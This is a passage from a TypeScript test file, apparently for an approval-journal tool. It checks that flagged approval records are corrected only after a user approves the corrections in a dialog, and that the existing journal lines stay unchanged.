      ].map((e) => JSON.stringify(e)).join("\n") + "\n",
    );
    return path;
  }
  const journalTool = (args: Record<string, unknown>, approvalChannel?: UserApprovalChannel) =>
    callTool("praxis_approval_journal", { repo, ...args }, { role: "developer", version: "t", client: CHAT, ...(approvalChannel ? { approvalChannel } : {}) }) as Promise<McpEnvelope>;

  it("finds both, and corrects them only after the user approves exactly those corrections", async () => {
    process.env.PRAXIS_APPROVAL_PAGE = "off";
    const path = seed();
    const before = readFileSync(path, "utf8");
    const audit = await journalTool({});
    expect(audit.ok).toBe(true);
    expect((audit.data as { toAmend: Array<{ rule: string }> }).toAmend.map((f) => f.rule)).toEqual(["client-answered-without-dialog", "agent-reported-decline"]);
    // without a way to ask the user, nothing is appended
    const refused = await journalTool({ amend: true, confirmation: "YES" });
    expect(refused.code).toBe("APPROVAL_CLIENT_UI_REQUIRED");
    // the refused request is journaled like any other; no correction is
    expect(readFileSync(path, "utf8").startsWith(before)).toBe(true);
    expect(readFileSync(path, "utf8")).not.toMatch(/"type":"amendment"/);
    // the user approves the corrections in a dialog
    const seen: string[] = [];
    const approving: UserApprovalChannel = { kind: "client-elicitation", ask: async (r) => (seen.push(r.description), { answer: "approve" }) };
    const amended = await journalTool({ amend: true, confirmation: "YES" }, approving);
    expect(amended.ok, JSON.stringify(amended.errors)).toBe(true);
    expect(amended.data).toMatchObject({ appended: 2, toAmend: [] });
    expect(seen[0]).toMatch(/No existing line is changed/);
    const after = readFileSync(path, "utf8");
    expect(after.startsWith(before)).toBe(true);
    expect((await journalTool({})).data).toMatchObject({ amendments: 2, byDecision: { "auto-answered/client": 1, "withdrawn/agent": 1 } });
  });
});
